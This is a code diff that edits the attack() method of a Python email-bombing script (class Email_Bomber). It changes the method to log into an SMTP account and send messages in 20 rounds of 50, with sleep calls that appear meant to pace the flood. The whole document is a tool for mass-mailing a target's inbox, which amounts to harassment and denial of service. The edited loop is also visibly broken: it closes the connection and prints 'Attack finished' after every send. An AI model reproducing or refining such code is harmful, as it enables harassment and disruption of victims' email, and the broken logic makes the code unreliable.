@@ -1,4 +1,3 @@
-'''imports'''
 import smtplib
 import sys
 import time
@@ -102,13 +101,22 @@ class Email_Bomber:
         except Exception as e:
             print(f'ERROR: {e}')
     
+
+    
     def attack(self):
-        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
-        for email in range(self.amount+1):
-            self.send()
-        self.s.close()
-        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
-        sys.exit(0)
+      for email in range(20):
+        print(bcolors.GREEN + '\n+[+[+[ Attempting secure account login... ]+]+]+')
+      
+        self.s.login(self.fromAddr, self.fromPwd)
+        print(bcolors.RED + '\n+[+[+[ Attacking parts for 50 batch... ]+]+]+')
+        for email in range(50):
+          self.send()
+          time.sleep(0.5)
+          time.sleep(60)
+          self.s.close()
+          print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+            
+            
 
 if __name__=='__main__':
     banner()
